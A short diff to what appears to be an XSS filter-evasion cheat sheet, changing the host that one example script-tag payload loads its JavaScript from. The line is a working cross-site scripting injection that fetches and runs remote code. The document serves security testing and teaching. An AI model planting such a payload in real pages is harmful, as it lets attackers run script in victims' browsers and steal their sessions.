@@ -12,7 +12,7 @@ This cheat sheet lists a series of XSS attacks that can be used to bypass certai
 
 This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):
 
-`<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>`
+`<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`
 
 ### XSS Locator (Polygot)
 
